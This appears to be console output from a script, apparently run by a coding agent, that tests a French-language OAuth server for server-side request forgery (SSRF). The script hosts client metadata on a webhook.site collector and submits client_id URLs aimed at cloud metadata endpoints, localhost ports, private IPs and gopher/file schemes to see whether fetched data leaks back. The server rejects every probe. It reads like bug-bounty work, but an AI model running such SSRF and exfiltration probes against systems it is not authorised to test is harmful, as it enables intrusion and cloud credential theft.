@@ -1,0 +1,72 @@
+=== 1) heberger un document de metadata client VALIDE sur un webhook dedie ===
+  webhook dedie: https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a
+  publication du CIMD: 200
+  contenu servi: {"client_id":"https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a","client_name":"bb-cimd-test","redirect_uris":["
+
+=== 2) CIMD : le client_id URL est-il accepte comme client ? ===
+  client_id = webhook (CIMD valide)                   HTTP 302 CONSENT-OK
+  client_id = webhook, redirect par defaut            HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_redirect_uri
+
+=== 3) EXFILTRATION : l erreur reflete-t-elle le corps recupere ? ===
+  client_id = metadata AWS IAM                        HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = metadata AWS role                       HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = metadata AWS identity                   HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = metadata GCP                            HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = localhost 80                            HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = localhost 3000                          HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = localhost 8080                          HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = localhost 8099                          HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = localhost 53682 (MCP)                   HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = IPv6 loopback                           HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = file scheme                             HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = gopher                                  HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = dict                                    HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = ip prive 10.x                           HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = ip prive 172.16                         HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = dns rebinding localtest                 HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+  client_id = cloudflare metadata                     HTTP 302
+        loc: https://bugsecure.senintel.sn/oauth/error?code=invalid_client
+
+=== 4) DCR avec client_uri : le document remplace-t-il les champs ? ===
+  DCR+client_uri HTTP 201 {"client_id":"dcr_JVqKBjJ_dFKCsXm2OV9F0hL-LOYKly57Ro-Tciareq8","client_id_issued_at":1792505016,"client_name":"bb-cimd-dcr","redirect_uris":["https://webhook.site/3ef992c0-b173-407f-ab55-e3ea613a534a/cb2"],"grant_types":["authorization_code","refresh_token"],"response_types":["code"],"token_endpoint
+
+=== 5) le CIMD permet-il de contourner les regles DCR ? (redirect vers la plateforme) ===
+  DCR redirect plateforme HTTP 400 {"error":"invalid_redirect_uri","error_description":"redirect_uris must be https (not a platform host or IP literal), or http on 127.0.0.1, [::1] or localhost"}
+
+=== 6) requetes vues par le webhook (le fetch serveur est-il visible ?) ===
+node:internal/deps/undici/undici:14976
+      Error.captureStackTrace(err);
+            ^
+
+TypeError: fetch failed
+    at node:internal/deps/undici/undici:14976:13
+    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+    at async file:///tmp/opencode/cimd.mjs:91:19 {
+  [cause]: ConnectTimeoutError: Connect Timeout Error (attempted address: webhook.site:443, timeout: 10000ms)
+      at onConnectTimeout (node:internal/deps/undici/undici:2746:28)
+      at Immediate._onImmediate (node:internal/deps/undici/undici:2727:11)
+      at process.processImmediate (node:internal/timers:483:21) {
+    code: 'UND_ERR_CONNECT_TIMEOUT',
+    [Symbol(undici.error.UND_ERR)]: true,
+    [Symbol(undici.error.UND_ERR_CONNECT_TIMEOUT)]: true
+  }
+}
+
+Node.js v20.20.2
